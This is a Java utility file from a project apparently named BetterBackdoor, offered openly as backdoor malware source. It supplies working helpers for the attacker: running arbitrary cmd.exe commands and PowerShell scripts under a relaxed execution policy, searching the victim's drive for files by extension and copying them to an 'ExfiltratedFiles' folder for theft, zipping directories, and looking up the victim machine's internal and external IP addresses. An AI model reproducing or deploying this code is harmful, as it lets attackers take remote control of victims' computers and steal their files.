package com.thatcherdev.betterbackdoor.backend;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Inet4Address;
import java.net.Inet6Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

import com.thatcherdev.betterbackdoor.backdoor.Backdoor;

import org.apache.commons.io.FileUtils;
import org.apache.commons.io.IOUtils;

public class Utils {

	/**
	 * Runs command {@link command} in the current machine's command prompt and
	 * returns response.
	 *
	 * @param command command to run
	 * @return response from running command
	 */
	public static String runCommand(String command) {
		String resp = "";
		BufferedReader bufferedReader = null;
		try {
			ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", command);
			builder.redirectErrorStream(true);
			bufferedReader = new BufferedReader(new InputStreamReader(builder.start().getInputStream()));
			while (true) {
				String line = bufferedReader.readLine();
				if (line == null) {
					while (resp.endsWith("\n"))
						resp = resp.substring(0, resp.length() - 1);
					break;
				}
				resp += line + "\n";
			}
			if (resp.isEmpty())
				return "Command did not produce a response";
			else
				return resp;
		} catch (Exception e) {
			resp = "An error occurred when trying to run command";
			if (e.getMessage() != null)
				resp += ":\n" + e.getMessage();
			return resp;
		} finally {
			try {
				if (bufferedReader != null)
					bufferedReader.close();
			} catch (Exception e) {
			}
		}
	}

	/**
	 * Uses {@link #runCommand(String)} to run the PowerShell script with the name
	 * {@link filename}.
	 *
	 * @param filename name of script to run
	 * @return response from running script
	 */
	public static String runPSScript(String filename) {
		return runCommand("Powershell.exe -executionpolicy remotesigned -File " + filename);
	}

	/**
	 * Copies all files that have extensions in {@link exts} from {@link root} to
	 * {@link Backdoor#gatheredDir}\ExfiltratedFiles'.
	 *
	 * @param root directory to copy files from
	 * @param exts list of extensions of files to copy
	 * @throws IOException
	 */
	public static void exfilFiles(String root, ArrayList<String> exts) throws IOException {
		new File(Backdoor.gatheredDir + "ExfiltratedFiles").mkdir();
		for (String ext : exts)
			for (String file : new ArrayList<String>(
					Arrays.asList(Utils.runCommand("c: && cd " + root + " && dir/b/s/a:-d *." + ext).split("\n"))))
				if (!file.equals("File Not Found"))
					FileUtils.copyFile(new File(file), new File(
							Backdoor.gatheredDir + "ExfiltratedFiles\\" + file.substring(file.lastIndexOf("\\") + 1)));
	}

	/**
	 * Compresses directory with name {@link dir} to zip file '{@link dir}.zip'.
	 * 
	 * @param dir name of directory to compress
	 * @throws IOException
	 * @throws FileNotFoundException
	 */
	public static void zipDir(String dir) throws IOException, FileNotFoundException {
		File dirAsFile = new File(dir);
		ZipOutputStream zipFile = new ZipOutputStream(new FileOutputStream(dirAsFile.getAbsolutePath() + ".zip"));
		dirToZip(dirAsFile, dirAsFile.getAbsolutePath(), zipFile);
		IOUtils.closeQuietly(zipFile);
	}

	/**
	 * Recursively adds the contents of directory {@link rootDir} to the
	 * ZipOutputStream {@link out}.
	 * 
	 * @param rootDir   root directory
	 * @param sourceDir source directory
	 * @param out       ZipOutputStream
	 * @throws IOException
	 * @throws FileNotFoundException
	 */
	private static void dirToZip(File rootDir, String sourceDir, ZipOutputStream out)
			throws IOException, FileNotFoundException {
		for (File file : new File(sourceDir).listFiles()) {
			String fileName = file.getName();
			if (file.isDirectory())
				dirToZip(rootDir, sourceDir + File.separator + fileName, out);
			else {
				ZipEntry entry = new ZipEntry(
						sourceDir.replace(rootDir.getParent() + File.separator, "") + "/" + fileName);
				out.putNextEntry(entry);

				FileInputStream in = new FileInputStream(sourceDir + "/" + fileName);
				IOUtils.copy(in, out);
				IOUtils.closeQuietly(in);
			}
		}
	}

	/**
	 * Decompresses zip file with name {@link zipFileName}.
	 * 
	 * @param zipFileName name of zip file to decompress
	 * @return directory where contents of zip file with name {@link zipFileName}
	 *         were copied
	 * @throws IOException
	 */
	public static String unzip(String zipFileName) throws IOException {
		ZipFile zipFile = new ZipFile(zipFileName);
		String outputDir = new File(zipFileName).getParent();
		Enumeration<? extends ZipEntry> entries = zipFile.entries();
		while (entries.hasMoreElements()) {
			ZipEntry entry = entries.nextElement();
			File entryDestination = new File(outputDir, entry.getName());
			if (entry.isDirectory())
				entryDestination.mkdirs();
			else {
				entryDestination.getParentFile().mkdirs();
				try (InputStream in = zipFile.getInputStream(entry);
						OutputStream out = new FileOutputStream(entryDestination)) {
					IOUtils.copy(in, out);
				}
			}
		}
		zipFile.close();
		return outputDir;
	}

	/**
	 * If {@link ipType} is "internal", returns the internal IP address of the
	 * current machine. Otherwise, if {@link ipType} is "external", returns the
	 * external IP address of the current machine.
	 * 
	 * @param ipType type of IP address to return
	 * @return either the internal or external IP address of the current machine
	 * @throws IOException
	 */
	public static String getIP(String ipType) throws IOException {
		String ret = null;
		if (ipType.equals("internal")) {
			Enumeration<NetworkInterface> majorInterfaces = NetworkInterface.getNetworkInterfaces();
			while (majorInterfaces.hasMoreElements()) {
				NetworkInterface inter = (NetworkInterface) majorInterfaces.nextElement();
				for (Enumeration<InetAddress> minorInterfaces = inter.getInetAddresses(); minorInterfaces
						.hasMoreElements();) {
					InetAddress add = (InetAddress) minorInterfaces.nextElement();
					if (!add.isLoopbackAddress())
						if (add instanceof Inet4Address)
							ret = add.getHostAddress();
						else if (add instanceof Inet6Address)
							continue;
				}
			}
		} else if (ipType.equals("external")) {
			URL checkIP = new URL("http://checkip.amazonaws.com");
			BufferedReader in = new BufferedReader(new InputStreamReader(checkIP.openStream()));
			String ip = in.readLine();
			in.close();
			ret = ip;
		}
		return ret;
	}
}